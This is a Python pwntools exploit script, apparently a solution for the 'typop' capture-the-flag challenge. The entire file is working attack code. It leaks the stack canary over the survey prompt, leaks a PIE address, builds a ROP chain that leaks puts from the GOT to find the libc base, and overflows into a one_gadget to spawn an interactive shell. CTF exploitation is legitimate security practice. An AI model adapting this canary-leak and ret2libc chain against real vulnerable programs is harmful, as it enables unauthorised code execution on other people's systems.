from pwn import *

target = process('./chall')

pid = gdb.attach(target, 'b *getFeedback+70\nb *getFeedback+172\nb *getFeedback+199\ncontinue')

elf = ELF('chall')
libc = ELF('libc-2.31.so')
#target = remote('typop.chal.idek.team', 1337)

print(target.recvuntil(b'complete a survey?'))

target.sendline(b'y')
print(target.recvuntil(b'ctf?'))
payload1 = b'a' * 11
target.send(payload1)

print(target.recvuntil(payload1))

leak = target.recv(7)
canary = u64(b'\x00' + leak)
print(hex(canary))

payload2 = cyclic(100)
padding = b'a' * 10
payload2 = padding
payload2 += p64(canary)
payload2 += b'a' * 8

payload2 += b'\x42'
target.send(payload2) 

print(target.recvuntil(b'ctf?'))
payload3 = b'a' * 0x1a
target.send(payload3)
print(target.recvuntil(payload3))
leak = target.recv(6)
print(leak)
main_55 = u64(leak + b'\x00' * 2)
pie_base = main_55 - elf.symbols['main'] - 55
pop_rdi = pie_base + 0x00000000000014d3
pop_rsi_r15 = pie_base + 0x00000000000014d1
writable = pie_base + elf.bss()
print(hex(pop_rdi))

payload4 = padding
payload4 += p64(canary)
payload4 += b'b' * 8
payload4 += p64(pop_rdi)
payload4 += p64(pie_base + elf.got['puts'])
payload4 += p64(pie_base + elf.symbols['puts'])
payload4 += p64(pie_base + elf.symbols['getFeedback'])
target.sendline(payload4)

print(target.recvuntil(b'feedback?\n'))
leak = target.recv(6)
puts_libc = u64(leak + b'\x00' * 2)
print(hex(puts_libc))
libc_base = puts_libc - libc.symbols['puts']
onegadget = libc_base + 0xe3b01
pop_rdx = libc_base + 0x0000000000142c92
print(hex(pop_rdx))


print(target.recvuntil(b'ctf?'))
payload5 = b'a' * 2
target.send(payload5)
print(target.recvuntil(payload5))


payload6 = padding
payload6 += p64(canary)
payload6 += b'b' * 8
payload6 += p64(pop_rdx)
payload6 += p64(0)
payload6 += p64(onegadget)

target.sendline(payload6)
target.interactive()

